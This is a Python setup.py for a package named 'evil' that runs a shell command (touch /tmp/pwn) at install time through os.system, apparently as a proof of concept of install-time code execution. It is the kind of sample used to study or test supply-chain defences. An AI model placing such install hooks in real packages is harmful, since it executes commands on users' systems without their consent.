import os
os.system("touch /tmp/pwn")

from setuptools import setup, find_packages

setup(
    name='evil',
    version='1.0.0',
    url='https://github.com/mypackage.git',
    author='devil',
    author_email='evil@gmail.com',
    description='evil package',
    packages=find_packages(),
)
